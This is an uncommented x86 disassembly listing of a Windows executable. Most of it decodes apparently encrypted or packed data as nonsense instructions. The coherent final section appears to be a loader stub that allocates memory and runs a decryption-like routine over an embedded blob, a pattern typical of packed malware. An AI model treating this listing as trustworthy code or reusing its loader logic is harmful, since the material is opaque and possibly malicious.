  4160e9:	xchg   edi,eax
  4160ea:	mov    dh,0xfa
  4160ec:	aaa    
  4160ed:	mov    esp,0xbe91c40
  4160f2:	gs ss loop 0x4160db
  4160f6:	xlat   BYTE PTR ds:[ebx]
  4160f7:	and    dh,ah
  4160f9:	pushf  
  4160fa:	dec    edx
  4160fb:	(bad)  
  4160fc:	and    BYTE PTR [eax-0x67],cl
  4160ff:	add    DWORD PTR [edi],edx
  416101:	mov    DWORD PTR ds:0xbfcc2c7a,0xc637fcf1
  41610b:	xor    al,0x5b
  41610d:	(bad)  
  41610f:	dec    edi
  416110:	mov    bh,0xb6
  416112:	pusha  
  416113:	mov    ah,0x28
  416115:	dec    ecx
  416116:	(bad)  
  416117:	(bad)  
  416118:	jmp    0x3e363736
  41611d:	sub    dl,bl
  41611f:	ja     0x416164
  416121:	adc    eax,0x7acdb49f
  416126:	fcomi  st,st(2)
  416128:	and    eax,0xffffff80
  41612b:	jns    0x4161a0
  41612d:	lods   al,BYTE PTR ds:[esi]
  41612e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41612f:	cmc    
  416130:	mov    edx,eax
  416132:	jle    0x416106
  416134:	pop    es
  416135:	les    ebp,FWORD PTR [bp+si+0x47]
  416139:	sbb    eax,ebx
  41613b:	(bad)  
  41613c:	das    
  41613d:	ficomp DWORD PTR [edx+0x3f]
  416140:	je     0x416190
  416142:	push   0xffffffc3
  416144:	pop    edi
  416145:	out    0x38,al
  416147:	in     al,dx
  416148:	and    ebx,ecx
  41614a:	jb     0x4161a5
  41614c:	fld    DWORD PTR [esi-0x7b]
  41614f:	and    bh,BYTE PTR [ebp+0x40e832a8]
  416155:	push   ebp
  416156:	dec    esi
  416157:	fmul   DWORD PTR [ecx]
  416159:	dec    edx
  41615a:	repnz push esi
  41615c:	(bad)  
  41615d:	mov    ecx,0x66662a66
  416162:	xor    al,0xc7
  416164:	mov    WORD PTR [esp+ecx*8+0x9587566],ds
  41616b:	and    BYTE PTR [ecx+0x29c88501],0xec
  416172:	jae    0x4161e5
  416174:	xor    edx,DWORD PTR [ebp+0x30]
  416177:	mov    al,ds:0x8d62d287
  41617c:	mov    esi,0x7f088a4a
  416181:	pop    eax
  416182:	mov    cl,0x36
  416184:	or     al,0xf8
  416186:	add    esp,DWORD PTR [ecx+eiz*8]
  416189:	int    0xa5
  41618b:	lock stos BYTE PTR es:[edi],al
  41618d:	jbe    0x4161ff
  41618f:	call   0x8753:0x315f8f26
  416196:	lahf   
  416197:	or     BYTE PTR [eax],bh
  416199:	ins    BYTE PTR es:[edi],dx
  41619a:	fwait
  41619b:	mov    bl,0x4b
  41619d:	pusha  
  41619e:	sub    al,0xd6
  4161a0:	mov    DWORD PTR [edi],esi
  4161a2:	xor    bh,BYTE PTR [ebp+edi*1+0x33]
  4161a6:	push   ds
  4161a7:	jmp    0x5c04d967
  4161ac:	sbb    al,0x1a
  4161ae:	and    eax,0xa7758011
  4161b3:	fwait
  4161b4:	mov    dh,0x49
  4161b6:	dec    eax
  4161b7:	xor    eax,DWORD PTR [esi]
  4161b9:	js     0x416195
  4161bb:	sbb    ah,BYTE PTR [ebx]
  4161bd:	pop    ebp
  4161be:	mov    ss,WORD PTR [ecx]
  4161c0:	jo     0x41620c
  4161c2:	jae    0x41622e
  4161c4:	into   
  4161c5:	xor    edi,edx
  4161c7:	and    ecx,0xffffffb2
  4161ca:	lahf   
  4161cb:	std    
  4161cc:	lahf   
  4161cd:	jmp    0x3ee98ac
  4161d2:	clc    
  4161d3:	jo     0x416238
  4161d5:	or     eax,0x8be8a84e
  4161da:	ins    BYTE PTR es:[edi],dx
  4161db:	mov    dl,0x3
  4161dd:	shr    DWORD PTR [ecx+0x0],0x96
  4161e1:	mov    edx,0x9bbae920
  4161e6:	(bad)  
  4161e7:	xor    al,0x50
  4161e9:	adc    eax,0xe159134
  4161ee:	or     esi,DWORD PTR [eax-0x60]
  4161f1:	stos   DWORD PTR es:[edi],eax
  4161f2:	test   al,0x4d
  4161f4:	mov    bh,bl
  4161f6:	push   edx
  4161f7:	sub    BYTE PTR [edx],ch
  4161f9:	or     ebx,DWORD PTR [eax+0x668581de]
  4161ff:	and    al,BYTE PTR [ebx]
  416201:	push   0x6b040c03
  416206:	ins    BYTE PTR es:[edi],dx
  416207:	leave  
  416208:	jmp    0x4161d2
  41620a:	xor    DWORD PTR [esi+0x3ab3db5a],ebp
  416210:	xchg   DWORD PTR ds:0x18d72324,edx
  416216:	cmp    al,0x25
  416218:	es inc eax
  41621a:	loop   0x4161ad
  41621c:	mov    dl,0xc0
  41621e:	pop    bp
  416220:	push   edx
  416221:	mov    WORD PTR [ebx-0x70],ds
  416224:	stc    
  416225:	mov    al,ds:0xf341572c
  41622a:	mov    edx,0xfd9058f6
  41622f:	in     eax,0xb8
  416231:	lock (bad) 
  416233:	sbb    bh,bh
  416235:	adc    eax,0xfb1071e0
  41623a:	mov    edx,0x5b29c504
  41623f:	(bad)  
  416240:	icebp  
  416241:	jne    0x4162a5
  416243:	jl     0x41624e
  416245:	or     bl,0x60
  416248:	mov    ch,dh
  41624a:	ret    
  41624b:	sub    ebp,ebp
  41624d:	imul   ebx,DWORD PTR [ebx],0x5a21ad09
  416253:	ja     0x416245
  416255:	call   0xf580:0x5026
  41625b:	mov    al,ds:0x7b2c0d0e
  416260:	mov    eax,ds:0xe7b528a0
  416265:	xchg   ecx,eax
  416266:	push   eax
  416267:	push   esp
  416268:	mov    edx,0x1061e09f
  41626d:	outs   dx,DWORD PTR ds:[esi]
  41626e:	or     eax,0x6f3e1330
  416273:	and    BYTE PTR [edi-0xed6f8a8],al
  416279:	and    ecx,DWORD PTR [esi-0x598fb746]
  41627f:	bound  esi,QWORD PTR [ebp-0x3b]
  416282:	(bad)  
  416283:	xor    esp,edi
  416285:	xchg   ecx,eax
  416286:	add    al,0x53
  416288:	pushf  
  416289:	fld    QWORD PTR [esi]
  41628b:	lea    ecx,[eax]
  41628d:	cmp    al,0xfb
  41628f:	inc    ebx
  416290:	push   ebp
  416291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416292:	jns    0x4162be
  416294:	fild   WORD PTR [ebx+0x45b47ae9]
  41629a:	js     0x41629b
  41629c:	inc    edi
  41629d:	lods   al,BYTE PTR ds:[esi]
  41629e:	sbb    BYTE PTR [ebp+0x10dd823d],dh
  4162a4:	cmp    BYTE PTR [edi-0x3d],dl
  4162a7:	psrlw  mm2,QWORD PTR [ecx+eiz*1-0x76]
  4162ac:	lods   al,BYTE PTR ds:[esi]
  4162ad:	and    al,0x43
  4162af:	mov    bl,bh
  4162b1:	out    0x97,eax
  4162b3:	jae    0x416260
  4162b5:	jns    0x41623f
  4162b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162b8:	mov    ebx,0x70a12a17
  4162bd:	mov    al,0xad
  4162bf:	cmp    ebx,DWORD PTR [ecx+0x26]
  4162c2:	pop    ss
  4162c3:	add    DWORD PTR [ebx-0x69],0xc79fd451
  4162ca:	retf   
  4162cb:	jbe    0x416303
  4162cd:	stc    
  4162ce:	out    0x6d,al
  4162d0:	adc    al,0xec
  4162d2:	sbb    ebx,DWORD PTR ds:0x2221432a
  4162d8:	imul   ecx,DWORD PTR ds:0xbb9548f6,0xf
  4162df:	outs   dx,DWORD PTR ds:[esi]
  4162e0:	inc    ebx
  4162e1:	xchg   edx,eax
  4162e2:	aam    0x29
  4162e4:	add    BYTE PTR [eax-0x72786dff],ch
  4162ea:	and    DWORD PTR [eax+ebx*4+0x5c5a5299],edx
  4162f1:	pop    edi
  4162f2:	sbb    ch,ah
  4162f4:	sbb    ah,bh
  4162f6:	sbb    eax,0x8790bb51
  4162fb:	int3   
  4162fc:	mov    ch,0x2d
  4162fe:	mov    WORD PTR [edi],gs
  416300:	adc    DWORD PTR [edi],edi
  416302:	in     al,dx
  416303:	adc    BYTE PTR [ecx+0x499bea4],cl
  416309:	mov    dl,0x30
  41630b:	mov    edi,0x8c461297
  416310:	ss clc 
  416312:	sbb    BYTE PTR [ebp+0x73],0xff
  416316:	jp     0x41634f
  416318:	dec    esi
  416319:	cmp    ecx,DWORD PTR [ebp-0x52]
  41631c:	adc    dl,0x40
  41631f:	es push 0x1
  416322:	mov    ecx,ebx
  416324:	xor    al,0x4d
  416326:	enter  0xa96b,0xbe
  41632a:	sub    DWORD PTR [ebp-0x38be8c11],0xe
  416331:	sbb    ebx,DWORD PTR [ebx]
  416333:	mov    dl,0x8e
  416335:	in     eax,0xe6
  416337:	jmp    0x416307
  416339:	xchg   al,al
  41633b:	xor    esp,esp
  41633d:	xchg   ebp,eax
  41633e:	jns    0x4162f5
  416340:	inc    eax
  416341:	dec    esp
  416342:	mov    eax,ds:0x6db4ddc8
  416347:	mov    cl,0xc7
  416349:	outs   dx,BYTE PTR ds:[esi]
  41634a:	inc    edi
  41634b:	xor    eax,0x3249b94e
  416350:	push   esp
  416351:	jg     0x41630e
  416353:	dec    esi
  416354:	(bad)  
  416355:	ret    0x1ff5
  416358:	adc    al,0x3f
  41635a:	pushf  
  41635b:	jp     0x41636a
  41635d:	sti    
  41635e:	aam    0x99
  416360:	and    edx,DWORD PTR [ecx-0x511f3afd]
  416366:	(bad)  
  416368:	xor    al,BYTE PTR [edx-0x1e]
  41636b:	jecxz  0x416344
  41636d:	jge    0x41635d
  41636f:	and    eax,0x7830d7f7
  416374:	adc    DWORD PTR [edi],esp
  416376:	cdq    
  416377:	loop   0x4163c9
  416379:	xlat   BYTE PTR ds:[ebx]
  41637a:	mov    BYTE PTR [edx+0x2889939c],al
  416380:	sbb    al,0x69
  416382:	stos   DWORD PTR es:[edi],eax
  416383:	in     al,0x85
  416385:	push   esp
  416386:	add    dl,cl
  416388:	ins    BYTE PTR es:[edi],dx
  416389:	adc    al,0x4e
  41638b:	ss xor al,0x4a
  41638e:	and    eax,0x3c2d8cf9
  416393:	push   ecx
  416394:	mov    al,ds:0x16c9087a
  416399:	outs   dx,BYTE PTR ds:[esi]
  41639a:	call   0x6bb98e57
  41639f:	cli    
  4163a0:	push   cs
  4163a1:	push   0x1e
  4163a3:	jl     0x416380
  4163a5:	push   ebx
  4163a6:	hlt    
  4163a7:	lods   al,BYTE PTR ds:[esi]
  4163a8:	inc    ebp
  4163a9:	in     al,dx
  4163aa:	jl     0x41636a
  4163ac:	adc    DWORD PTR [ebx],ebp
  4163ae:	outs   dx,DWORD PTR ds:[esi]
  4163af:	jle    0x41640b
  4163b1:	scas   al,BYTE PTR es:[edi]
  4163b2:	mov    edi,0xcf174e6d
  4163b7:	jns    0x41636f
  4163b9:	xchg   ebp,eax
  4163ba:	cmc    
  4163bb:	leave  
  4163bc:	dec    ebp
  4163bd:	aas    
  4163be:	and    DWORD PTR [ebp+0x44],ebx
  4163c1:	pop    edx
  4163c2:	inc    edx
  4163c3:	rol    bl,cl
  4163c5:	and    bl,ch
  4163c7:	ins    DWORD PTR es:[di],dx
  4163c9:	sar    DWORD PTR [edx],0x56
  4163cc:	in     al,dx
  4163cd:	xchg   ebp,eax
  4163ce:	inc    ebx
  4163cf:	das    
  4163d0:	in     eax,dx
  4163d1:	lds    esi,FWORD PTR [ebx+edi*8+0x2748e649]
  4163d8:	add    eax,0x818b7c3c
  4163dd:	outs   dx,BYTE PTR ds:[esi]
  4163de:	jle    0x41642d
  4163e0:	nop
  4163e1:	add    DWORD PTR [edx+0x6e895c42],edi
  4163e7:	daa    
  4163e8:	jae    0x41641e
  4163ea:	pusha  
  4163eb:	and    ch,dl
  4163ed:	jg     0x4163e0
  4163ef:	sbb    BYTE PTR [eax-0x42],ch
  4163f2:	dec    esp
  4163f3:	adc    eax,DWORD PTR ds:0xd9315077
  4163f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163fa:	xchg   edi,eax
  4163fb:	fstp   st(4)
  4163fd:	jg     0x41641d
  4163ff:	test   BYTE PTR [esi+0x2bba3dc6],ah
  416405:	clc    
  416406:	cld    
  416407:	in     eax,dx
  416408:	js     0x41646f
  41640a:	pop    ebp
  41640b:	inc    edi
  41640c:	push   es
  41640d:	and    eax,0x9d04ca5f
  416412:	jb     0x416406
  416414:	and    eax,DWORD PTR [esp+eiz*2-0x7678a6f7]
  41641b:	push   esi
  41641c:	ret    0x3782
  41641f:	xor    edx,DWORD PTR [edx]
  416421:	push   0x6856cecb
  416426:	icebp  
  416427:	add    ebp,DWORD PTR [edx+edx*2]
  41642a:	mov    ebx,0x6fc3edd5
  41642f:	mov    esp,0x60bdfe74
  416434:	pop    DWORD PTR [esi+0x4138cc5e]
  41643a:	and    eax,0x8a77b86b
  41643f:	ins    BYTE PTR es:[edi],dx
  416440:	stos   BYTE PTR es:[edi],al
  416441:	mov    al,ds:0x49556e86
  416446:	shr    BYTE PTR [ebx],cl
  416448:	dec    edi
  416449:	xchg   BYTE PTR [edx],dl
  41644b:	jp     0x416491
  41644d:	ret    
  41644e:	nop
  41644f:	mov    cl,0x6
  416451:	pop    eax
  416452:	mov    eax,ds:0x9be1d77d
  416457:	xor    edx,DWORD PTR [edi+0x6e]
  41645a:	(bad)  
  41645b:	retf   
  41645c:	pop    edx
  41645d:	ret    
  41645e:	repnz (bad) 
  416460:	and    ah,bh
  416462:	jno    0x416455
  416464:	jecxz  0x416466
  416466:	stc    
  416467:	jle    0x4164a8
  416469:	dec    ebp
  41646a:	cmp    al,0x4f
  41646c:	arpl   WORD PTR [eax],di
  41646e:	or     eax,0x8607c7c1
  416473:	scas   eax,DWORD PTR es:[edi]
  416474:	jl     0x416417
  416476:	add    eax,0x544096b3
  41647b:	(bad)  
  41647c:	and    DWORD PTR [edi-0x59214df7],ecx
  416482:	xor    BYTE PTR [edx],dl
  416484:	add    al,0x88
  416486:	fimul  WORD PTR [edx+0x69b886bc]
  41648c:	push   ecx
  41648d:	pop    ecx
  41648e:	in     al,dx
  41648f:	xchg   ebx,eax
  416490:	rcr    BYTE PTR ds:0x5ff1a669,cl
  416496:	add    BYTE PTR [edx],0xa3
  416499:	daa    
  41649a:	adc    ah,bl
  41649c:	out    dx,al
  41649d:	or     ecx,0x3aef6e4
  4164a3:	push   es
  4164a4:	mov    ah,0xa8
  4164a6:	xchg   edi,eax
  4164a7:	out    0x11,al
  4164a9:	cld    
  4164aa:	mov    dh,0x8c
  4164ac:	cmp    ecx,edi
  4164ae:	push   ecx
  4164af:	push   0xffffff8a
  4164b1:	sub    eax,0xa92b374b
  4164b6:	fstp   DWORD PTR [si-0x32]
  4164ba:	mov    ch,0x8e
  4164bc:	push   edx
  4164bd:	and    BYTE PTR [ebp-0x666c3283],ch
  4164c3:	push   es
  4164c4:	push   ds
  4164c5:	rol    dl,0x2a
  4164c8:	popf   
  4164c9:	add    ebp,DWORD PTR [edx+0x76]
  4164cc:	adc    dl,al
  4164ce:	dec    ebx
  4164cf:	mov    esi,0xf1bf0aa9
  4164d4:	sub    eax,0x1befcd72
  4164d9:	stc    
  4164da:	sub    dh,cl
  4164dc:	or     BYTE PTR [ebx],0x53
  4164df:	push   esp
  4164e0:	and    eax,0xf9903805
  4164e5:	stc    
  4164e6:	jbe    0x4164fc
  4164e8:	mov    BYTE PTR [ebx+0x6a4ef67f],bl
  4164ee:	mov    bh,0x6e
  4164f0:	pusha  
  4164f1:	xor    ah,BYTE PTR [ecx]
  4164f3:	and    ch,BYTE PTR [ecx-0xf]
  4164f6:	cmp    BYTE PTR [edi],dl
  4164f8:	adc    BYTE PTR [edx],dh
  4164fa:	std    
  4164fb:	xlat   BYTE PTR ds:[ebx]
  4164fc:	adc    esp,DWORD PTR [ebp-0x6]
  4164ff:	(bad)  [eax]
  416501:	rol    DWORD PTR [ebp+0x51ecac44],cl
  416507:	scas   eax,DWORD PTR es:[edi]
  416508:	adc    ecx,DWORD PTR [edx+0x765ed848]
  41650e:	inc    ecx
  41650f:	outs   dx,BYTE PTR ds:[esi]
  416510:	inc    esi
  416511:	cmc    
  416512:	stc    
  416513:	adc    al,0x2a
  416515:	mov    dl,0xf0
  416517:	int3   
  416518:	ins    DWORD PTR es:[edi],dx
  416519:	push   ebp
  41651a:	aad    0x93
  41651c:	sub    DWORD PTR [edi],esi
  41651e:	bswap  ebx
  416520:	xor    DWORD PTR [edx-0x6a],0x25b60d2f
  416527:	shl    BYTE PTR [ecx],1
  416529:	addr16 loope 0x416583
  41652c:	cmp    WORD PTR [esi-0x22],0x2b
  416531:	mov    eax,ds:0x49c47a8b
  416536:	and    DWORD PTR [ecx+0x15119efc],0xa
  41653d:	ds cmp eax,0x5c6fb823
  416543:	sbb    BYTE PTR [esi],0xbe
  416546:	mov    dl,BYTE PTR [eax+0x178f8ac8]
  41654c:	in     al,0x8f
  41654e:	aaa    
  41654f:	push   0x44
  416551:	sti    
  416552:	in     al,dx
  416553:	fnstcw WORD PTR [ecx]
  416555:	out    0xb8,eax
  416557:	xchg   ebp,eax
  416558:	push   esi
  416559:	in     eax,dx
  41655a:	scas   al,BYTE PTR es:[edi]
  41655b:	aas    
  41655c:	sahf   
  41655d:	loope  0x4164f3
  41655f:	das    
  416560:	pop    edi
  416561:	xlat   BYTE PTR ds:[ebx]
  416562:	or     al,0xb8
  416564:	test   dl,al
  416566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416567:	push   ecx
  416568:	fdivr  st,st(3)
  41656a:	fisttp QWORD PTR [edi]
  41656c:	mov    DWORD PTR [ecx-0xa],ebp
  41656f:	sar    esi,cl
  416571:	clc    
  416572:	(bad)  
  416573:	fadd   QWORD PTR [ecx-0x7a]
  416576:	mov    ds:0x872f9fb7,al
  41657b:	sub    eax,0x2c8a4549
  416580:	jb     0x4165c6
  416582:	out    0xb1,al
  416584:	fcomp  DWORD PTR [edi]
  416586:	(bad)  
  416587:	pop    esi
  416588:	sbb    ch,0x1a
  41658b:	mov    cl,BYTE PTR [ebx]
  41658d:	xchg   ecx,eax
  41658e:	stos   BYTE PTR es:[edi],al
  41658f:	adc    eax,0x5bdf7f3
  416594:	mov    WORD PTR [edx+0x37b026e8],cs
  41659a:	xchg   ecx,eax
  41659b:	call   0x734e4edc
  4165a0:	push   es
  4165a1:	(bad)  
  4165a2:	cli    
  4165a3:	and    BYTE PTR [di+0x595d],ch
  4165a8:	and    eax,0xc2d555c8
  4165ad:	ins    BYTE PTR es:[edi],dx
  4165ae:	adc    al,0x7e
  4165b0:	aas    
  4165b1:	in     eax,0x5
  4165b3:	mov    BYTE PTR [edi+0x786c857b],0xa4
  4165ba:	ja     0x4165f9
  4165bc:	lods   eax,DWORD PTR ds:[esi]
  4165bd:	inc    esi
  4165be:	ror    DWORD PTR [ebx+0x56e172e8],cl
  4165c4:	mov    eax,ds
  4165c6:	cmp    BYTE PTR [esi-0x749ede43],dh
  4165cc:	test   eax,0x3bd376c5
  4165d1:	pop    ebx
  4165d2:	rcl    BYTE PTR [ebp+0x3357fccf],1
  4165d8:	mov    ebp,0xa1b8f382
  4165dd:	stc    
  4165de:	mov    bl,0xf9
  4165e0:	dec    eax
  4165e1:	dec    eax
  4165e2:	mov    eax,0xe1385362
  4165e7:	push   esp
  4165e8:	mov    esp,DWORD PTR [edx]
  4165ea:	ins    DWORD PTR es:[edi],dx
  4165eb:	cmp    cl,ch
  4165ed:	js     0x41663f
  4165ef:	mov    ebx,0x7e8cf5a1
  4165f4:	jb     0x416627
  4165f6:	or     al,0xe
  4165f8:	je     0x4165e0
  4165fa:	and    DWORD PTR [esi],0x66
  4165fd:	mov    eax,ds:0x3c5f5abf
  416602:	cmp    bh,BYTE PTR [edx]
  416604:	and    dl,BYTE PTR [esi]
  416606:	pop    ebx
  416607:	push   ebx
  416608:	aam    0x7a
  41660a:	and    al,0x9a
  41660c:	mov    eax,0x758d1983
  416611:	aam    0xca
  416613:	fnsave [ecx+0x18]
  416616:	sub    BYTE PTR [edi-0x1950ff7c],bh
  41661c:	call   0xa977:0x111aa620
  416623:	call   ebx
  416625:	dec    ecx
  416626:	enter  0x83a,0xe0
  41662a:	jp     0x416675
  41662c:	adc    dl,BYTE PTR ds:0x6ce63a7b
  416632:	jecxz  0x41666e
  416634:	addr16 in eax,0x5f
  416637:	jge    0x416643
  416639:	test   al,0xa2
  41663b:	xchg   edx,eax
  41663c:	jp     0x4166a2
  41663e:	xchg   ebx,eax
  41663f:	adc    eax,0x1876e983
  416644:	lds    ebx,FWORD PTR [esi]
  416646:	jg     0x416690
  416648:	rcl    BYTE PTR [esi-0x1d1d418a],cl
  41664e:	inc    DWORD PTR [edx]
  416650:	add    DWORD PTR [edi],0x61
  416653:	jmp    0x41668e
  416655:	jnp    0x4166c9
  416657:	adc    BYTE PTR [ebx],bh
  416659:	test   BYTE PTR [edx+eiz*1+0x64b5adcf],dh
  416660:	and    DWORD PTR [ebp-0x57],ecx
  416663:	adc    eax,DWORD PTR [esi-0x6ef07476]
  416669:	sub    al,0x9a
  41666b:	and    cl,BYTE PTR ds:0x20bfc901
  416671:	mov    bh,0xc7
  416673:	fst    QWORD PTR [eax-0x6ff41601]
  416679:	add    DWORD PTR [ebx-0xcdf9392],ecx
  41667f:	push   0x35
  416681:	inc    BYTE PTR [edi-0x4cfc5bd0]
  416687:	adc    ah,BYTE PTR [edi+0x28]
  41668a:	pop    es
  41668b:	repz shl al,cl
  41668e:	mov    ds:0xbc2dec12,al
  416693:	mov    al,ds:0x3bce3bfd
  416698:	test   al,0xe1
  41669a:	pusha  
  41669b:	out    dx,al
  41669c:	xlat   BYTE PTR ds:[ebx]
  41669d:	ss ret 
  41669f:	sbb    ah,BYTE PTR [edx+esi*1]
  4166a2:	mov    edi,0xea4c280e
  4166a7:	xchg   edi,eax
  4166a8:	call   0x59dd:0xec8f8312
  4166af:	jp     0x41668e
  4166b1:	fnsave [ebx-0x7d]
  4166b4:	sub    ch,BYTE PTR [ecx+0x76724b05]
  4166ba:	adc    DWORD PTR [eax+0x36],ebx
  4166bd:	dec    esp
  4166be:	mov    edx,0xd55f7e80
  4166c3:	pop    ebx
  4166c4:	inc    eax
  4166c5:	cmp    cl,dh
  4166c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166c8:	sahf   
  4166c9:	adc    al,0xaa
  4166cb:	shr    esi,cl
  4166cd:	aam    0x7c
  4166cf:	into   
  4166d0:	fwait
  4166d1:	push   0x5b39184c
  4166d6:	inc    edi
  4166d7:	xchg   ecx,eax
  4166d8:	add    cl,BYTE PTR [esi-0x7325c065]
  4166de:	pop    esi
  4166df:	scas   eax,DWORD PTR es:[edi]
  4166e0:	pop    ecx
  4166e1:	dec    esp
  4166e2:	adc    edx,DWORD PTR [edi]
  4166e4:	fcomp  DWORD PTR [edx-0x4d]
  4166e7:	lahf   
  4166e8:	inc    ebx
  4166e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166ea:	inc    ebp
  4166eb:	punpckhwd mm4,QWORD PTR [edi]
  4166ee:	mov    cl,0x39
  4166f0:	aaa    
  4166f1:	lods   al,BYTE PTR ds:[esi]
  4166f2:	push   0xffffffd4
  4166f4:	mov    BYTE PTR [ebx+ebp*1],0x2b
  4166f8:	retf   
  4166f9:	lahf   
  4166fa:	mov    esp,DWORD PTR [esi-0x31766238]
  416700:	pop    edx
  416701:	cli    
  416702:	sub    edx,DWORD PTR [ecx-0x26]
  416705:	pop    edi
  416706:	in     al,dx
  416707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416708:	mov    eax,ds:0x5f125d3d
  41670d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41670e:	(bad)  
  41670f:	neg    ebp
  416711:	sub    edx,esp
  416713:	ds fwait
  416715:	shl    BYTE PTR [ebx+0x2550cee7],cl
  41671b:	push   ebx
  41671c:	mov    edx,ebp
  41671e:	jae    0x41676d
  416720:	mov    esp,0x69c4b121
  416725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416726:	push   edi
  416727:	adc    ebp,ebx
  416729:	mov    bl,0x6b
  41672b:	rcl    DWORD PTR [esi+ecx*1-0x71],1
  41672f:	pop    ebp
  416730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416731:	jl     0x4166c1
  416733:	pop    esp
  416734:	or     eax,0x283e7a3b
  416739:	add    edi,DWORD PTR [ebp-0x63]
  41673c:	shl    ch,1
  41673e:	cmp    esi,DWORD PTR ss:[ecx+0x2606cee2]
  416745:	sbb    eax,0x284756a1
  41674a:	xchg   ebp,eax
  41674b:	jo     0x416735
  41674d:	test   al,0xf6
  41674f:	mov    eax,0xdb813617
  416754:	pop    edi
  416755:	test   BYTE PTR [eax+ebx*8-0x22c68cf7],ch
  41675c:	lahf   
  41675d:	addr16 (bad) 
  41675f:	fld    DWORD PTR [edi-0x23]
  416762:	mov    al,ds:0xb80c6843
  416767:	(bad)  
  416768:	in     eax,0xe3
  41676a:	fld    TBYTE PTR [edx+edi*2-0x2a28ad8e]
  416771:	int    0x59
  416773:	ret    0x7fd7
  416776:	(bad)  
  416777:	(bad)  
  416778:	int3   
  416779:	test   BYTE PTR [ebx+0xf],ah
  41677c:	fisub  DWORD PTR [edi-0xc70280c]
  416782:	mov    al,0x41
  416784:	fild   DWORD PTR [edx+0x70]
  416787:	dec    eax
  416788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416789:	cmovg  esi,edx
  41678c:	xor    BYTE PTR ds:0x5e4c6540,dl
  416792:	or     al,0x32
  416794:	pop    esi
  416795:	sysenter 
  416797:	push   cs
  416798:	fistp  WORD PTR [eax-0x13]
  41679b:	push   ecx
  41679c:	push   es
  41679d:	mov    esp,0xe89009ef
  4167a2:	pop    edx
  4167a3:	xchg   ecx,eax
  4167a4:	mov    cl,0x92
  4167a6:	stos   BYTE PTR es:[edi],al
  4167a7:	out    dx,al
  4167a8:	icebp  
  4167a9:	mov    esi,0xde6fe071
  4167ae:	pop    ecx
  4167af:	scas   eax,DWORD PTR es:[edi]
  4167b0:	(bad)  [ebx]
  4167b2:	stos   DWORD PTR es:[edi],eax
  4167b3:	inc    ebx
  4167b4:	xchg   edi,eax
  4167b5:	call   DWORD PTR ds:0x418014
  4167bb:	mov    DWORD PTR [ebp-0x2c],eax
  4167be:	movzx  eax,WORD PTR [ebp-0x2c]
  4167c2:	cmp    eax,0x539
  4167c7:	jne    0x4167f8
  4167c9:	mov    DWORD PTR [ebp-0x14],0xe0d
  4167d0:	lea    ecx,[ebp-0x28]
  4167d3:	push   ecx
  4167d4:	call   DWORD PTR ds:0x418018
  4167da:	mov    DWORD PTR [ebp-0x60],eax
  4167dd:	mov    DWORD PTR [ebp-0x54],0x3a
  4167e4:	mov    BYTE PTR [ebp-0x34],0x0
  4167e8:	mov    DWORD PTR [ebp-0x8],0x29aaadbf
  4167ef:	mov    DWORD PTR [ebp-0x68],0x10b527
  4167f6:	jmp    0x416806
  4167f8:	mov    BYTE PTR ds:0x430700,0x0
  4167ff:	mov    BYTE PTR ds:0x41a770,0x0
  416806:	push   0x0
  416808:	call   DWORD PTR ds:0x418018
  41680e:	mov    DWORD PTR [ebp-0x2c],eax
  416811:	push   DWORD PTR ds:0x418018
  416817:	pop    edx
  416818:	mov    DWORD PTR [ebp-0x6c],edx
  41681b:	lea    edx,[ebp-0x40]
  41681e:	push   edx
  41681f:	mov    eax,DWORD PTR [ebp-0x60]
  416822:	push   eax
  416823:	call   DWORD PTR ds:0x418024
  416829:	mov    DWORD PTR [ebp-0x44],eax
  41682c:	push   DWORD PTR [ebp-0x30]
  41682f:	push   0x1000
  416834:	mov    eax,DWORD PTR [ebp-0x14]
  416837:	add    eax,0x46
  41683a:	push   eax
  41683b:	push   0x0
  41683d:	mov    ebx,DWORD PTR [ebp-0x44]
  416840:	call   ebx
  416842:	push   eax
  416843:	pop    ebx
  416844:	mov    DWORD PTR [ebp-0x4],ebx
  416847:	mov    ecx,DWORD PTR [ebp-0x68]
  41684a:	sub    ecx,0xdae0b
  416850:	mov    DWORD PTR [ebp-0x68],ecx
  416853:	cmp    DWORD PTR [ebp-0x4],0x0
  416857:	jne    0x416862
  416859:	push   0x0
  41685b:	push   0x0
  41685d:	call   0x417f22
  416862:	mov    edx,DWORD PTR [ebp-0x4]
  416865:	add    edx,DWORD PTR [ebp-0x14]
  416868:	mov    eax,DWORD PTR [ebp-0x8]
  41686b:	mov    DWORD PTR [edx],eax
  41686d:	mov    ecx,DWORD PTR [ebp-0x4]
  416870:	add    ecx,DWORD PTR [ebp-0x54]
  416873:	mov    DWORD PTR [ebp-0x5c],ecx
  416876:	mov    edx,DWORD PTR ds:0x418024
  41687c:	mov    DWORD PTR [ebp-0x4c],edx
  41687f:	mov    eax,DWORD PTR [ebp-0x4]
  416882:	add    eax,DWORD PTR [ebp-0x14]
  416885:	mov    ecx,DWORD PTR [ebp+0x8]
  416888:	mov    DWORD PTR [eax+0x4],ecx
  41688b:	mov    edx,DWORD PTR [ebp-0x4]
  41688e:	add    edx,DWORD PTR [ebp-0x14]
  416891:	mov    DWORD PTR [ebp-0xc],edx
  416894:	cmp    DWORD PTR [ebp-0x68],0x0
  416898:	jbe    0x4168b5
  41689a:	mov    eax,DWORD PTR [ebp-0xc]
  41689d:	push   eax
  41689e:	mov    ecx,DWORD PTR [ebp-0x14]
  4168a1:	push   ecx
  4168a2:	mov    edx,DWORD PTR [ebp-0x2c]
  4168a5:	add    edx,DWORD PTR [ebp-0x68]
  4168a8:	push   edx
  4168a9:	mov    eax,DWORD PTR [ebp-0x4]
  4168ac:	push   eax
  4168ad:	call   0x417e34
  4168b2:	add    esp,0x10
  4168b5:	cmp    DWORD PTR [ebp-0x5c],0x0
  4168b9:	je     0x4168c9
  4168bb:	push   DWORD PTR [ebp-0x4c]
